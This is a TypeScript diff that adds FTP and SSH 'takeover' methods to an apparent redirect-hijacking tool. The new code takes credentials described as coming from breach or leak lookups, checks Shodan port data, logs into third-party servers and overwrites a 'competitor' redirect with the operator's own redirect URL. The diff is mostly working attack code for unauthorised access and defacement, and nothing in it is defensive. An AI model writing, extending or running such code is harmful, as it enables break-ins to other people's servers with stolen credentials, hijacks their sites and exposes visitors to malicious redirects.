@@ -46,6 +46,12 @@ export interface TakeoverConfig {
   wpCredentials?: { username: string; password: string };
   /** If we already have a shell URL */
   shellUrl?: string;
+  /** FTP credentials from LeakCheck/breach hunt */
+  ftpCredentials?: { host: string; username: string; password: string; port?: number }[];
+  /** SSH credentials from LeakCheck/breach hunt */
+  sshCredentials?: { host: string; username: string; password?: string; privateKey?: string; port?: number }[];
+  /** Shodan port intelligence — which ports are open */
+  openPorts?: number[];
   onProgress?: (phase: string, detail: string) => void;
 }
 
@@ -387,6 +393,32 @@ export async function executeRedirectTakeover(config: TakeoverConfig): Promise<T
     const shellResult = await safeAttackMethod("shell_overwrite", () => takeoverViaShell(config, detection), progress);
     results.push(shellResult);
     if (shellResult.success) return results;
+  }
+
+  // Method A2: If we have FTP credentials (from LeakCheck), overwrite via FTP
+  if (config.ftpCredentials && config.ftpCredentials.length > 0) {
+    const ftpPortOpen = !config.openPorts || config.openPorts.includes(21);
+    if (ftpPortOpen) {
+      progress("takeover", `📂 FTP credentials available (${config.ftpCredentials.length}) — direct file overwrite via FTP...`);
+      const ftpResult = await safeAttackMethod("ftp_overwrite", () => takeoverViaFtp(config, detection), progress);
+      results.push(ftpResult);
+      if (ftpResult.success) return results;
+    } else {
+      progress("takeover", `⚠️ FTP port 21 closed (Shodan) — skip FTP takeover`);
+    }
+  }
+
+  // Method A3: If we have SSH credentials (from LeakCheck), overwrite via SFTP
+  if (config.sshCredentials && config.sshCredentials.length > 0) {
+    const sshPortOpen = !config.openPorts || config.openPorts.includes(22);
+    if (sshPortOpen) {
+      progress("takeover", `🔐 SSH credentials available (${config.sshCredentials.length}) — direct file overwrite via SFTP...`);
+      const sshResult = await safeAttackMethod("ssh_overwrite", () => takeoverViaSsh(config, detection), progress);
+      results.push(sshResult);
+      if (sshResult.success) return results;
+    } else {
+      progress("takeover", `⚠️ SSH port 22 closed (Shodan) — skip SSH takeover`);
+    }
   }
 
   // Method B: If we have WP credentials, use WP admin methods
@@ -1071,4 +1103,113 @@ async function getWpNonce(baseUrl: string, cookies: string): Promise<string> {
   } catch {}
   
   return "";
+}
+
+// ═══════════════════════════════════════════════════════
+//  TAKEOVER VIA FTP (using leaked credentials)
+// ═══════════════════════════════════════════════════════
+
+async function takeoverViaFtp(config: TakeoverConfig, detection: RedirectDetectionResult): Promise<TakeoverResult> {
+  const progress = config.onProgress || (() => {});
+  const domain = new URL(config.targetUrl).hostname;
+
+  if (!config.ftpCredentials || config.ftpCredentials.length === 0) {
+    return { success: false, method: "ftp_overwrite", detail: "No FTP credentials available" };
+  }
+
+  try {
+    const { ftpUploadRedirect } = await import("./ftp-uploader");
+
+    for (const cred of config.ftpCredentials) {
+      progress("ftp_takeover", `📂 Trying FTP: ${cred.username}@${cred.host}:${cred.port || 21}...`);
+
+      try {
+        const result = await Promise.race([
+          ftpUploadRedirect({
+            credential: {
+              host: cred.host,
+              port: cred.port || 21,
+              username: cred.username,
+              password: cred.password,
+            },
+            redirectUrl: config.ourRedirectUrl,
+            targetDomain: domain,
+            onProgress: (msg) => progress("ftp_takeover", msg),
+          }),
+          new Promise<never>((_, reject) => setTimeout(() => reject(new Error("FTP takeover timeout")), 30000)),
+        ]);
+
+        if (result.success) {
+          return {
+            success: true,
+            method: "ftp_overwrite",
+            detail: `FTP takeover success: ${cred.username}@${cred.host} → overwrote competitor redirect (${detection.competitorUrl}) with ${config.ourRedirectUrl}`,
+            overwrittenCompetitorUrl: detection.competitorUrl || undefined,
+            injectedUrl: result.url || config.targetUrl,
+          };
+        }
+      } catch (e: any) {
+        progress("ftp_takeover", `⚠️ FTP ${cred.username}@${cred.host} failed: ${e.message}`);
+      }
+    }
+
+    return { success: false, method: "ftp_overwrite", detail: `Tried ${config.ftpCredentials.length} FTP credentials — all failed` };
+  } catch (err: any) {
+    return { success: false, method: "ftp_overwrite", detail: `FTP takeover error: ${err.message}` };
+  }
+}
+
+// ═══════════════════════════════════════════════════════
+//  TAKEOVER VIA SSH/SFTP (using leaked credentials)
+// ═══════════════════════════════════════════════════════
+
+async function takeoverViaSsh(config: TakeoverConfig, detection: RedirectDetectionResult): Promise<TakeoverResult> {
+  const progress = config.onProgress || (() => {});
+  const domain = new URL(config.targetUrl).hostname;
+
+  if (!config.sshCredentials || config.sshCredentials.length === 0) {
+    return { success: false, method: "ssh_overwrite", detail: "No SSH credentials available" };
+  }
+
+  try {
+    const { sshUploadRedirect } = await import("./ssh-uploader");
+
+    for (const cred of config.sshCredentials) {
+      progress("ssh_takeover", `🔐 Trying SSH: ${cred.username}@${cred.host}:${cred.port || 22}...`);
+
+      try {
+        const result = await Promise.race([
+          sshUploadRedirect({
+            credential: {
+              host: cred.host,
+              port: cred.port || 22,
+              username: cred.username,
+              password: cred.password || "",
+              privateKey: cred.privateKey,
+            },
+            redirectUrl: config.ourRedirectUrl,
+            targetDomain: domain,
+            onProgress: (msg) => progress("ssh_takeover", msg),
+          }),
+          new Promise<never>((_, reject) => setTimeout(() => reject(new Error("SSH takeover timeout")), 30000)),
+        ]);
+
+        if (result.success) {
+          return {
+            success: true,
+            method: "ssh_overwrite",
+            detail: `SSH/SFTP takeover success: ${cred.username}@${cred.host} → overwrote competitor redirect (${detection.competitorUrl}) with ${config.ourRedirectUrl}`,
+            overwrittenCompetitorUrl: detection.competitorUrl || undefined,
+            injectedUrl: result.url || config.targetUrl,
+          };
+        }
+      } catch (e: any) {
+        progress("ssh_takeover", `⚠️ SSH ${cred.username}@${cred.host} failed: ${e.message}`);
+      }
+    }
+
+    return { success: false, method: "ssh_overwrite", detail: `Tried ${config.sshCredentials.length} SSH credentials — all failed` };
+  } catch (err: any) {
+    return { success: false, method: "ssh_overwrite", detail: `SSH takeover error: ${err.message}` };
+  }
 }
